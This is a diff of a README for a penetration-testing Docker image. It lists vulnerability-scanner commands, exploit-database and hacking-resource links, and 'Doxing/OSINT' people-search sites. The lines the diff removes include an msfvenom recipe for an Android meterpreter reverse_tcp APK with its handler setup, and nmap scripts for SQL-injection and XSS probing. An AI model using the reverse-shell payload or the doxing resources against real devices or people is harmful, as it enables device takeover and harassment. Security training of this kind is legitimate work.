@@ -6,11 +6,19 @@ Docker Hacklab
 Quick Start
 ---
 
-```bash
-# Run Hacklab
-docker run -d --name hacklab --net=host --privileged -it jcherqui/docker-hacklab
+```
+$ docker run -d --name hacklab --net=host --privileged -it jcherqui/docker-hacklab
+ _  _   _   ___ _  ___      _   ___
+| || | /_\ / __| |/ / |    /_\ | _ )
+| __ |/ _ \ (__| ' <| |__ / _ \| _ \
+|_||_/_/ \_\___|_|\_\____/_/ \_\___/
+https://github.com/jcherqui/docker-hacklab
+```
 
-# Vuln Scanners
+Run other vuln scanners
+---
+
+```bash
 docker run -d --name nessus -p 8834:8834 infoslack/nessus
 docker run -d --name openvas -p 443:443 -p 9390:9390 -p 9391:9391 mikesplain/openvas
 ```
@@ -21,50 +29,30 @@ Doxing/OSINT
 - http://www.peekyou.com/
 - https://pipl.com/
 
-Cheat Sheet
+Exploit database
 ---
 
+- http://cve.mitre.org/
+- http://0day.today/
+- https://www.exploit-db.com/
+
+Links
+---
+
+- https://github.com/enaqx/awesome-pentest
+- https://github.com/Hack-with-Github/Awesome-Hacking
+- https://github.com/sindresorhus/awesome#security
+- https://github.com/carpedm20/awesome-hacking
+- https://penetration-testing.zeef.com/jeroen.rijken
+- http://sectools.org/
+- http://pwnwiki.io/
+- https://www.cybrary.it/
+- http://null-byte.wonderhowto.com/
+- https://hackademics.fr
+- https://github.com/gchq/CyberChef
+- https://github.com/danielmiessler/SecLists
+- https://pentest-tools.com/
 - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-
-Autopwn
----
-
-https://github.com/ngalongc/AutoLocalPrivilegeEscalation
-
-ClickJacking
----
-
-https://samy.pl/quickjack/
-
-Android
----
-
-```
-msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R > FILENAME.apk
-msfconsole
-use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set LHOST <ip> *
-set LPORT <port>
-exploit -j
-```
-
-https://android.fallible.co/
-
-NMAP
----
-
-nmap -Pn --script=dns-brute <host> # Find subdomains of a website
-nmap -Pn --script=mysql-info <host> # Find mysql version
-nmap -Pn --script=http-sitenap-generator <host> # Display directory structure
-nmap -sV --script=vulscan <host> # Display vuln
-nmap -sV --script-args vulnscandb=exploit <host> # //
-nmap -Pn --script=http-xssed <host> # Search on xssed.com if XSS vulnerability
-nmap -sV  –script=http-sql-injection <host> # Test injection SQL
-
-TOP Channels youtube
----
-
 - https://www.youtube.com/user/Hak5Darren/videos
 - https://www.youtube.com/user/DEFCONConference/videos
 - https://www.youtube.com/user/BlackHatOfficialYT/videos
@@ -74,19 +62,6 @@ TOP Channels youtube
 - https://www.youtube.com/channel/UC286ntgASMskhPIJQebJVvA/videos
 - https://www.youtube.com/user/gaytony10/playlists
 - https://www.youtube.com/user/bhargavtandel/videos
-
-Links
----
-
-- https://github.com/enaqx/awesome-pentest
-- https://github.com/Hack-with-Github/Awesome-Hacking
-- https://github.com/sindresorhus/awesome#security
-- https://penetration-testing.zeef.com/jeroen.rijken
-- http://sectools.org/
-- http://pwnwiki.io/
-- https://www.cybrary.it/
-- http://null-byte.wonderhowto.com/
-- https://hackademics.fr
 
 License
 ---
